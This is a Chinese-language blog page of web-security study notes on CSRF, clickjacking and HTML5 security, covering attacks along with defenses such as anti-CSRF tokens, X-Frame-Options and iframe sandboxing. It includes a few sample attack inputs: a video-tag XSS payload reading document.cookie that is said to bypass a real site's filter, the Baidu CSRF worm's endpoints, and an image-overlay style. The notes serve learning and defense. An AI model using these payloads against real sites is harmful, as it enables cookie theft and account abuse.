+<h2 id="浏览器的Cookie策略"><a href="#浏览器的Cookie策略" class="headerlink" title="浏览器的Cookie策略"></a>浏览器的Cookie策略</h2><p>浏览器所持有的Cookie分为两种：</p>
+<p>一种是”Session Cookie”,又称”临时Cookie”;另一种是”Third-party Cookie”,也称为”本地Cookie”。Third-party Cookie服务器指定了Expire时间，会保存在本地。Session Cookie没有指定Expire时间，保存在浏览器进程的内存空间中，新打开的Tab页也是有效的，但浏览器关闭后就失效了。</p>
+<p>一个域加载另一个域的资源（比如使用img、iframe、script、link等标签），由于安全原因，许多浏览器会阻止Third-party Cookie的发送，只能发送Session Cookie。而某些浏览器不会阻止，前面删除文章的例子就是在不会阻止Third-party Cookie发送的浏览器中实现的。</p>
+<h2 id="P3P头的副作用"><a href="#P3P头的副作用" class="headerlink" title="P3P头的副作用"></a>P3P头的副作用</h2><p>浏览器拦截第三方Cookie发送，在某种程度上降低了CSRF攻击的威力。</p>
+<p>但是P3P Header会是问题复杂起来，它是W3C制定的一项关于隐私的标准，如果网站返回给浏览器的HTTP头中包含有P3P头，将允许浏览器发送第三方Cookie。它主要用于需要跨域访问页面的场景，如父页面b嵌入了iframe，iframe的src指向的a页面网址，a页面响应头有Set-Cookie。一般情况下由于跨域，在a.com上Set-Cookie是不会成功的，但是加入P3P头后，可以跨域Set-Cookie成功，浏览器也不会再拦截第三方Cookie的发送。P3P头只需要由网站设置一次即可，之后每次请求都会遵循此策略。</p>
+<h2 id="只有GET请求可以吗"><a href="#只有GET请求可以吗" class="headerlink" title="只有GET请求可以吗?"></a>只有GET请求可以吗?</h2><p>对于攻击者来说，有许多方法构造POST请求。</p>
+<p>1.form表单</p>
+<p>在页面中构造一个form表单，使用JavaScript自动提交这个表单。</p>
+<p>2.Flash</p>
+<p>Flash有多种方式能够发送网络请求，包括POST请求，如使用URLRequest、getURL、loadVars等。</p>
+<h2 id="CSRF-Worm"><a href="#CSRF-Worm" class="headerlink" title="CSRF Worm"></a>CSRF Worm</h2><p>2008年9月，国内安全组织80sec公布了一个百度的CSRF Worm。</p>
+<p>它主要利用了两个接口：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://msg.baidu.com/?...sn=用户账户&amp;co=消息内容...</span><br></pre></td></tr></table></figure>
+<p>修改参数sn，可以对指定用户发送短消息。</p>
+<p>而另一个接口能查询出某个用户的所有好友</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://frd.baidu.com/?...un=用户账户...</span><br></pre></td></tr></table></figure>
+<p>两者相结合，先让一个百度用户查看恶意页面后，给他所有好友发送一条短消息，消息中又包含一个恶意页面，使得好友将消息发送给他们的好友，就形成了一个CSRF Worm。</p>
+<h2 id="CSRF的防御"><a href="#CSRF的防御" class="headerlink" title="CSRF的防御"></a>CSRF的防御</h2><h3 id="验证码"><a href="#验证码" class="headerlink" title="验证码"></a>验证码</h3><p>验证码可以强制用户与应用进行交互，只有在用户知情的情况下才会发送请求。但是，出于用户体验考虑，不能给所有接口都加上验证码，所以只能作为一种辅助的防御手段。</p>
+<h3 id="Referer-Check"><a href="#Referer-Check" class="headerlink" title="Referer Check"></a>Referer Check</h3><p>Referer的值一般是请求所在的页面，Referer Check可以被用于检查请求是否来自合法的”源“。</p>
+<p>但是，服务器并非任何时候都可以取到Referer，很多用户处于隐私保护限制了Referer的发送。从Https跳转到http出于安全的考虑，浏览器也不会发送Referer。Flash一些低版本也可以伪造Referer。</p>
+<p>所以不能依赖Referer来防御，但作为监控CSRF攻击的发生，倒是一种可行的方法。</p>
+<h3 id="Anti-CSRF-Token"><a href="#Anti-CSRF-Token" class="headerlink" title="Anti CSRF Token"></a>Anti CSRF Token</h3><p>这是业内的常用做法。</p>
+<p>CSRF的本质是重要操作的所有参数都是可以被攻击者猜测到的。</p>
+<p>我们在参数上增加一个参数Token，这个Token是随机的，Token可以放在用户的Session中，或者浏览器的Cookie中，在提交请求时，服务器需要验证请求的Token和用户的Session（或Cookie）是否一致，如果一致，则请求是合法的。</p>
+<p>这是“不可预测性原则”的一种应用。</p>
+<h4 id="Token的使用原则"><a href="#Token的使用原则" class="headerlink" title="Token的使用原则"></a>Token的使用原则</h4><p>1.Token的生成一定要足够随机。</p>
+<p>2.可以允许在一个用户的有效生命周期内，使用同一个Token。但如果是下个周期，则应该生成新的Token（如表单已提交）。</p>
+<p>3.为了处理多个页面共存Token失效的问题，可以考虑生成多个有效的Token。</p>
+<p>4.要注意Token的保密性，可以把Token放在表单内部，而非url上，把敏感操作由GET改为POST，避免Token泄漏。当然如果网站存在XSS漏洞，Token也会泄漏，所以安全防御的体系是相辅相成的。</p>
+<h1 id="点击劫持（ClickJacking）"><a href="#点击劫持（ClickJacking）" class="headerlink" title="点击劫持（ClickJacking）"></a>点击劫持（ClickJacking）</h1><h2 id="什么是点击劫持"><a href="#什么是点击劫持" class="headerlink" title="什么是点击劫持"></a>什么是点击劫持</h2><p>点击劫持是一种视觉上的欺骗手段。攻击者一般使用一个透明的、不可见的iframe，覆盖在一个网页上，然后诱使用户在不知情的情况下点击透明的iframe页面。通过调整iframe页面的位置，可以诱使用户恰好点击iframe页面的一些功能性按钮上。</p>
+<p>通过控制iframe的长、宽，以及调整top、left位置，可以把iframe页面内任意部分覆盖到任何地方。同时设置iframe的position为absolute，并将z-index的值设置为最大，以达到让iframe处于页面的最上层。最后，再通过设置opacity来控制iframe页面的透明程度，值为0是完全不可见。</p>
+<p>在CSRF攻击中，如果出现用户需要交互的页面，攻击可能无法完成。但是，点击劫持没有这个问题，因为它利用的就是与用户产生交互的页面。</p>
+<h2 id="Flash点击劫持"><a href="#Flash点击劫持" class="headerlink" title="Flash点击劫持"></a>Flash点击劫持</h2><p>曾经有一个ClickJacking攻击案例，攻击者可以通过Flash构造了点击劫持，在完成一系列复杂的动作后，最终控制了用户电脑的摄像头。</p>
+<p>攻击者制作了一个Flash游戏，这个游戏就是让用户去点击“CLICK”按钮，每次点击后这个按钮的位置都会发生变化。在Flash上面隐藏了一个看不见的iframe，攻击通过诱导用户鼠标点击就能完成较复杂的动作。</p>
+<h2 id="图片覆盖攻击"><a href="#图片覆盖攻击" class="headerlink" title="图片覆盖攻击"></a>图片覆盖攻击</h2><p>图片覆盖也可以起到类似的点击劫持的作用。（XSIO，Cross Site Image Overlaying）</p>
+<p>通过调整图片的style可以使图片覆盖的任意指定位置。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">style</span>=<span class="string">"position: absolute; right: 320px; top: 90px"</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>如果应用没有限制style的position为absolute的话，图片可以覆盖到页面上的任意位置。</p>
+<p>用户点击图片，如果链接到一个钓鱼网站，用户可能就上当了。</p>
+<p>图片还可以伪装得像一个正常的链接、按钮；或者在图片中构造一些文字，覆盖在关键的位置，就有可能完全改变页面中想表达的意思。这种情况下，不需要用户点击，也能达到欺骗的目的。比如，修改图片中的联系电话。</p>
+<p>由于img标签在很多站点都是对用户开放的，在防御XSIO时，需要检查用户提交的HTML代码中，img标签的style属性是否可能导致浮出。</p>
+<h2 id="拖拽劫持与数据窃取"><a href="#拖拽劫持与数据窃取" class="headerlink" title="拖拽劫持与数据窃取"></a>拖拽劫持与数据窃取</h2><p>目前很多浏览器都支持Drag &amp; Drop的API。浏览器中的拖拽对象可以是一个链接，也可以是一段文字，还可以从一个窗口拖拽到另一个窗口，因此拖拽是不受同源策略限制的。</p>
+<p>拖拽劫持的思路是诱使用户从隐藏的不可见iframe中拖拽出攻击者希望得到的数据，然后放到攻击者能控制的另外一个页面中，从而窃取数据。</p>
+<h2 id="ClickJacking3-0：触屏劫持"><a href="#ClickJacking3-0：触屏劫持" class="headerlink" title="ClickJacking3.0：触屏劫持"></a>ClickJacking3.0：触屏劫持</h2><p>安全研究者称其为TapJacking。</p>
+<p>从手机OS的角度来看，触屏实际上就是一个事件，手机OS捕捉这些事件，并执行相应的动作。</p>
+<p>常见的几个事件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">touchstart: 手指触摸屏幕时发生</span><br><span class="line">touchend: 手指离开屏幕时发生</span><br><span class="line">touchmove: 手指滑动时发生</span><br><span class="line">touchcancel: 系统可取消touch事件</span><br></pre></td></tr></table></figure>
+<p>将一个不可见的iframe覆盖到当前网页上，就可以劫持用户的触屏操作。</p>
+<p>针对视觉效果的攻击可以被利用进行钓鱼和欺诈。</p>
+<h2 id="防御ClickJacking"><a href="#防御ClickJacking" class="headerlink" title="防御ClickJacking"></a>防御ClickJacking</h2><p>针对传统的ClickJacking，一般是通过禁止跨域的iframe来防范。</p>
+<h3 id="frame-busting"><a href="#frame-busting" class="headerlink" title="frame busting"></a>frame busting</h3><p>通过可以写一段JavaScript代码，以禁止iframe的嵌套。这种方法叫作frame busting。比如</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (top.location != location) &#123;</span><br><span class="line">  top.location = self.location;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>当然，还要很多很多frame busting的写法，这里就不一一罗列了。</p>
+<p>frame busting有一些缺陷，由于它是用JavaScript写的，控制能力并不是特别强，因此有很多方法可以绕过它。此外像HTML5的sandbox属性、IE中iframe的security属性等，都可以限制iframe页面中的JavaScript脚本执行，从而使frame busting失效。</p>
+<h3 id="X-Frame-Options"><a href="#X-Frame-Options" class="headerlink" title="X-Frame-Options"></a>X-Frame-Options</h3><p>X-Frame-Options可以说是为了解决ClickJacking而生的，它有三个可选的值：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DENY 拒绝当前页面加载任何frame页面</span><br><span class="line">SAMEORIGIN frame页面的地址只能为同源域名下的页面</span><br><span class="line">ALLOW-FROM origin 定义允许frame加载的页面地址</span><br></pre></td></tr></table></figure>
+<p>除了X-Frame-Options之外，Firefox的“Content Security Policy”以及Firefox的NoScript扩展也能有效防御ClickJacking。这些方案为我们提供了更多的选择。</p>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>ClickJacking主要被利用在钓鱼、欺诈和广告作弊等方面。相对于XSS与CSRF来说，因为需要诱导用户与页面产生交互行为，因此实施攻击的成本更高，在网络犯罪中比较少见。</p>
+<h1 id="HTML5安全"><a href="#HTML5安全" class="headerlink" title="HTML5安全"></a>HTML5安全</h1><p>HTML5带来了新的功能，也带来了新的安全挑战。</p>
+<h2 id="HTML5新标签"><a href="#HTML5新标签" class="headerlink" title="HTML5新标签"></a>HTML5新标签</h2><p>一些XSS Filter如果建立了一个黑名单的话，可能覆盖不到HTML5新增的标签和功能。</p>
+<p>如video可以远程加载一段视频，audio标签也类似。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">src</span>=<span class="string">"http://file.ogg"</span> <span class="attr">onloadedmetadata</span>=<span class="string">"alert(document.cookie);"</span>  <span class="attr">ondurationchanged</span>=<span class="string">"alert(/xss2)"</span> <span class="attr">ontimeupdate</span>=<span class="string">"alert(/xss1/);"</span>&gt;</span><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>可以成功绕过百度空间的XSS Filter。</p>
+<h2 id="iframe的sandbox"><a href="#iframe的sandbox" class="headerlink" title="iframe的sandbox"></a>iframe的sandbox</h2><p>在HTML5中，专门为<code>&lt;iframe&gt;</code>定义了一个新的属性，叫sandbox。使用sandbox这个属性，<code>&lt;iframe&gt;</code>标签加载的内容将被视为一个独立的”源”，其中的脚本将被禁止执行，表单被禁止提交，插件被禁止加载，指向其他浏览对象的链接也会被禁止。</p>
+<p>sandbox属性可以通过参数来支持更精确的控制。有以下几个值可以选择：</p>
+<p>1.allow-same-origin: 允许同源访问<br>2.allow-top-navigation: 允许访问顶层窗口<br>3.allow-forms: 允许提交表单<br>4.allow-script: 允许执行脚本</p>
+<p>有的行为即使设置了allow-scripts，也是不允许的，比如”弹出窗口“</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">sandbox</span>=<span class="string">"allow-same-origin allow-forms"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>毫无疑问，iframe的sandox属性将极大地增强应用使用iframe的安全性。</p>
+<h2 id="Link-Types-noreferrer"><a href="#Link-Types-noreferrer" class="headerlink" title="Link Types: noreferrer"></a>Link Types: noreferrer</h2><p>在HTML5中为<code>&lt;a&gt;</code>标签和<code>&lt;area&gt;</code>标签定义了一个新的Link Types: noreferrer。</p>
+<p>浏览器在请求该标签指定的地址时将不再发送Referer。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"xxx"</span> <span class="attr">rel</span>=<span class="string">"noreferrer"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这种设计是出于保护敏感信息和隐私的考虑。</p>
+<h2 id="Canvas的妙用"><a href="#Canvas的妙用" class="headerlink" title="Canvas的妙用"></a>Canvas的妙用</h2><p>canvas可以让javascript在页面中直接操作图片对象，也可以直接操作像素。</p>
+<p>所以完全可以用canvas实现简单的验证码破解功能，在浏览器中实现在线破解，这大大降低了攻击门槛。</p>
+<h2 id="其他安全问题"><a href="#其他安全问题" class="headerlink" title="其他安全问题"></a>其他安全问题</h2><h2 id="Cross-Origin-Resource-Sharing"><a href="#Cross-Origin-Resource-Sharing" class="headerlink" title="Cross-Origin Resource Sharing"></a>Cross-Origin Resource Sharing</h2><p>W3C委员制定了一个新标准来解决跨域访问问题。</p>
+<p>假设从<code>http://www.a.com/test.html</code>发起一个跨域的XMLHttpRequest请求，请求的地址为：<code>http://www.b.com/test.php</code></p>
+<p>如果服务器<a href="http://www.b.com返回一个HTTP" target="_blank" rel="noopener">www.b.com返回一个HTTP</a> Header:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Origin: http://www.a.conm</span><br></pre></td></tr></table></figure>
+<p>这个跨域请求就会被通过。</p>
+<p>在这个过程中，<code>http://www.a.com/test.html</code>发起的请求浏览器还会自动带上一个Origin Header</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Origin: http://www.a.com</span><br></pre></td></tr></table></figure>
+<p>它可以用于防范CSRF攻击。</p>
+<p>当然对于这个标准，还有很多http header可以用于更精确的控制。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Syntax</span><br><span class="line"></span><br><span class="line">response header:</span><br><span class="line"></span><br><span class="line">Access-Control-Allow-Origin</span><br><span class="line">Access-Control-Max-Age</span><br><span class="line">Access-Control-Allow-Credentials</span><br><span class="line">Access-Control-Allow-Methods</span><br><span class="line">Access-Control-Allow-Headers</span><br><span class="line"></span><br><span class="line">request header:</span><br><span class="line"></span><br><span class="line">Origin</span><br><span class="line">Access-Control-Request-Method</span><br><span class="line">Access-Control-Request-Headers</span><br></pre></td></tr></table></figure>
+<h2 id="postMessage——跨窗口传递消息"><a href="#postMessage——跨窗口传递消息" class="headerlink" title="postMessage——跨窗口传递消息"></a>postMessage——跨窗口传递消息</h2><p>postMessage允许每一个window(包括当前窗口、弹出窗口、iframes等)对象往其他的窗口发送文本消息，从而实现跨窗口的消息传递。这个功能是不受同源策略限制的。</p>
+<p>所以在使用postMessage时，有两个安全问题需要注意。</p>
+<p>1.在必要时，可以在接收窗口验证Domain，甚至是URL，以防止来自非法页面的消息。</p>
+<p>2.如果是将消息写入innerHTML，则可能导致DOM based XSS的产生。根据”Secure By Default“原则，应该对消息进行安全检查。</p>
+<h2 id="Web-Storage"><a href="#Web-Storage" class="headerlink" title="Web Storage"></a>Web Storage</h2><p>过去浏览器通用化的存储信息的方法只有Cookie，Cookie主要用于保存登录凭证和少量信息，其最大长度的限制决定了不可能存储太多信息，而Web Storage可以。</p>
+<p>Web Storage分为Session Storage和Local Storage。Session Storage关闭浏览器会失效，而Local Storage则会一直存在。它就向一个非关系型数据库，由Key-Value对组成，使用js方法window.sessionStorage.setItem(key, value)和window.sessionStorage.getItem(key)可以存取值。</p>
+<p>Web Storage也受同源策略的约束，每个域所拥有的信息只会保存在自己的域下。</p>
+<p>Web Storage的强大功能也为XSS Payload大开方便之门。攻击者有可能将恶意代码保存在Web Storage中，从而实现跨页面攻击。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/web安全/" rel="tag"># web安全</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/10/11/跨域方案/" rel="next" title="跨域的八种实现方案">
+                <i class="fa fa-chevron-left"></i> 跨域的八种实现方案
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/10/14/react知识汇总/" rel="prev" title="react知识汇总">
+                react知识汇总 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="lv-container" data-id="city" data-uid="MTAyMC8zNDUxMi8xMTA1MA=="></div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="小光">
+            
+              <p class="site-author-name" itemprop="name">小光</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">66</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">11</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">42</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/mfaying" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:1213560387@qq.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#浏览器安全、xss未复习，csrf已复习"><span class="nav-number">1.</span> <span class="nav-text">浏览器安全、xss未复习，csrf已复习</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#浏览器安全"><span class="nav-number">2.</span> <span class="nav-text">浏览器安全</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#同源策略"><span class="nav-number">2.1.</span> <span class="nav-text">同源策略</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#浏览器沙箱"><span class="nav-number">2.2.</span> <span class="nav-text">浏览器沙箱</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#恶意网址拦截"><span class="nav-number">2.3.</span> <span class="nav-text">恶意网址拦截</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#高速发展的浏览器安全"><span class="nav-number">2.4.</span> <span class="nav-text">高速发展的浏览器安全</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#跨站脚本攻击-XSS-详解"><span class="nav-number">3.</span> <span class="nav-text">跨站脚本攻击(XSS)详解</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS简介"><span class="nav-number">3.1.</span> <span class="nav-text">XSS简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS攻击进阶"><span class="nav-number">3.2.</span> <span class="nav-text">XSS攻击进阶</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#初识XSS-Payload"><span class="nav-number">3.3.</span> <span class="nav-text">初识XSS Payload</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#强大的XSS-Payload"><span class="nav-number">3.4.</span> <span class="nav-text">强大的XSS Payload</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#构造GET和POST请求"><span class="nav-number">3.4.1.</span> <span class="nav-text">构造GET和POST请求</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSS钓鱼"><span class="nav-number">3.4.2.</span> <span class="nav-text">XSS钓鱼</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#识别用户浏览器"><span class="nav-number">3.4.3.</span> <span class="nav-text">识别用户浏览器</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#识别用户安装的软件"><span class="nav-number">3.4.4.</span> <span class="nav-text">识别用户安装的软件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CSS-History-Hack"><span class="nav-number">3.4.5.</span> <span class="nav-text">CSS History Hack</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#获取用户的真实IP地址"><span class="nav-number">3.4.6.</span> <span class="nav-text">获取用户的真实IP地址</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS攻击平台"><span class="nav-number">3.5.</span> <span class="nav-text">XSS攻击平台</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#终极武器：XSS-Worm"><span class="nav-number">3.6.</span> <span class="nav-text">终极武器：XSS Worm</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Samy-Worm"><span class="nav-number">3.6.1.</span> <span class="nav-text">Samy Worm</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS构造技巧"><span class="nav-number">3.7.</span> <span class="nav-text">XSS构造技巧</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#利用字符编码"><span class="nav-number">3.7.1.</span> <span class="nav-text">利用字符编码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#绕过长度限制"><span class="nav-number">3.7.2.</span> <span class="nav-text">绕过长度限制</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#使用标签"><span class="nav-number">3.7.3.</span> <span class="nav-text">使用标签</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#window-name"><span class="nav-number">3.7.4.</span> <span class="nav-text">window.name</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Apache-Expect-Header-XSS"><span class="nav-number">3.7.5.</span> <span class="nav-text">Apache Expect Header XSS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Anehta的回旋镖"><span class="nav-number">3.7.6.</span> <span class="nav-text">Anehta的回旋镖</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Flash-XSS"><span class="nav-number">3.7.7.</span> <span class="nav-text">Flash XSS</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS的防御"><span class="nav-number">3.8.</span> <span class="nav-text">XSS的防御</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#HttpOnly"><span class="nav-number">3.8.1.</span> <span class="nav-text">HttpOnly</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#输入检查"><span class="nav-number">3.8.2.</span> <span class="nav-text">输入检查</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#输出检查"><span class="nav-number">3.8.3.</span> <span class="nav-text">输出检查</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#安全的编码函数"><span class="nav-number">3.8.3.1.</span> <span class="nav-text">安全的编码函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#只需要一种编码吗"><span class="nav-number">3.8.3.2.</span> <span class="nav-text">只需要一种编码吗</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#正确防御XSS"><span class="nav-number">3.8.4.</span> <span class="nav-text">正确防御XSS</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#在HTML标签中输出"><span class="nav-number">3.8.4.1.</span> <span class="nav-text">在HTML标签中输出</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#在HTML属性中输出"><span class="nav-number">3.8.4.2.</span> <span class="nav-text">在HTML属性中输出</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#在script标签中输出"><span class="nav-number">3.8.4.3.</span> <span class="nav-text">在script标签中输出</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#在事件中输出"><span class="nav-number">3.8.4.4.</span> <span class="nav-text">在事件中输出</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#在CSS中输出"><span class="nav-number">3.8.4.5.</span> <span class="nav-text">在CSS中输出</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#在地址栏输出"><span class="nav-number">3.8.4.6.</span> <span class="nav-text">在地址栏输出</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#处理富文本"><span class="nav-number">3.8.5.</span> <span class="nav-text">处理富文本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#防御DOM-Based-XSS"><span class="nav-number">3.8.6.</span> <span class="nav-text">防御DOM Based XSS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#换个角度看XSS的风险"><span class="nav-number">3.8.7.</span> <span class="nav-text">换个角度看XSS的风险</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#跨站点请求伪造-CSRF"><span class="nav-number">4.</span> <span class="nav-text">跨站点请求伪造(CSRF)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#一个例子"><span class="nav-number">4.1.</span> <span class="nav-text">一个例子</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#浏览器的Cookie策略"><span class="nav-number">4.2.</span> <span class="nav-text">浏览器的Cookie策略</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#P3P头的副作用"><span class="nav-number">4.3.</span> <span class="nav-text">P3P头的副作用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#只有GET请求可以吗"><span class="nav-number">4.4.</span> <span class="nav-text">只有GET请求可以吗?</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CSRF-Worm"><span class="nav-number">4.5.</span> <span class="nav-text">CSRF Worm</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CSRF的防御"><span class="nav-number">4.6.</span> <span class="nav-text">CSRF的防御</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#验证码"><span class="nav-number">4.6.1.</span> <span class="nav-text">验证码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Referer-Check"><span class="nav-number">4.6.2.</span> <span class="nav-text">Referer Check</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Anti-CSRF-Token"><span class="nav-number">4.6.3.</span> <span class="nav-text">Anti CSRF Token</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Token的使用原则"><span class="nav-number">4.6.3.1.</span> <span 